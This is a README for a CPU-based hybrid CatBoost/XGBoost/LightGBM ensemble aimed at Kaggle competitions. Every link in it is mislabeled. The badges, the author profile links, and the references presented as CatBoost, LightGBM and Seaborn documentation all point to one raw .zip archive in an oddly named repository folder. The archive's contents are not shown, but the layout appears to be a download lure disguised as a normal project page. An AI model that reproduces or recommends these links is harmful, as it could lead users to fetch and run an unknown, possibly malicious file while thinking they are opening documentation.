<p align="center">
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Kaggle" />
  </a>
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Python" />
  </a>
  <a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
    <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip" alt="Notebook" />
  </a>
<a href="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip">
  <img src="https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip%20Colab-Open%20Notebook-orange?logo=googlecolab&logoColor=white" alt="Google Colab" />
</a>
</p>

# 🔗 Hybrid Model (CPU-Based): CatBoost + XGBoost + LightGBM

## 👤 Author

| 👤 **Name** | 🔗 **Github-Profile** | 🔗 **Kaggle-Profile** |
|------------|----------------|----------------|
| Riddy Mazumder | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) | [![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |
| Atahar08 | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) | [![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |

This project uses a CPU-optimized hybrid ensemble model that combines the strengths of CatBoost, XGBoost, and LightGBM to achieve strong performance on medium-scale tabular datasets within Kaggle’s CPU constraints.

Instead of relying on a single algorithm, predictions from multiple gradient-boosting models are combined to improve generalization and stability.
# ⚙️ Why a CPU-Based Hybrid Model?

Kaggle notebooks often run on CPU-only environments, making GPU-heavy solutions impractical. This hybrid approach is designed to:

✅ Work efficiently on CPU

✅ Reduce overfitting through model diversity

✅ Capture different data patterns

✅ Improve leaderboard stability

🧩 Model Components
1️⃣ CatBoost (CPU)2️⃣ XGBoost (CPU)3️⃣ LightGBM (CPU)🔄 Ensemble Strategy

# Final Prediction Formula
 
````
 Final_Prediction/y_hat = (y_CatBoost + y_XGBoost + y_LightGBM) / 3
````
>This approach:
>
>Smooths individual model errors,
>Improves robustness on unseen data,
>Increases public and private leaderboard consistency.
# 🏆 Why This Hybrid Works Well on Kaggle
| Advantage                   | Benefit                               |
| --------------------------- | ------------------------------------- |
| Model Diversity             | Captures varied feature relationships |
| CPU Optimization            | Runs within Kaggle CPU limits         |
| Reduced Overfitting         | Ensemble effect                       |
| Minimal Feature Engineering | Especially with CatBoost              |
# 📊 Recommended Use Cases

Medium-scale tabular datasets

Mixed numerical + categorical features

Kaggle competitions with CPU restrictions

Regression and Classification tasks
# 🚀 Key Takeaway

A CPU-based hybrid ensemble of CatBoost, XGBoost, and LightGBM delivers near-GPU-level performance while remaining fully compatible with Kaggle’s CPU environment.
# 📖 References
| Resource               | Link                                                                                                                       |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Kaggle Competition     | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip) |
| CatBoost Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                                     |
| LightGBM Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                       |
| Seaborn Library        | [https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip](https://raw.githubusercontent.com/RiddyMazumder/Hybrid-Model-CPU-Based-CatBoost-XGBoost-LightGBM/main/undecorously/GBM_Based_XG_Light_Cat_Boost_Hybrid_CP_Model_3.5.zip)                                                                 |
## 📄 License

This project is licensed under the **MIT License**.

You are free to use, modify, and distribute this project for educational and personal purposes.

---

## 💬 Feedback & Contributions

If you have any questions, suggestions, or improvements:

* 🐞 Open an issue
* 📤 Submit a pull request

Contributions are always welcome! 😊

---

Happy analyzing and learning! 🚀
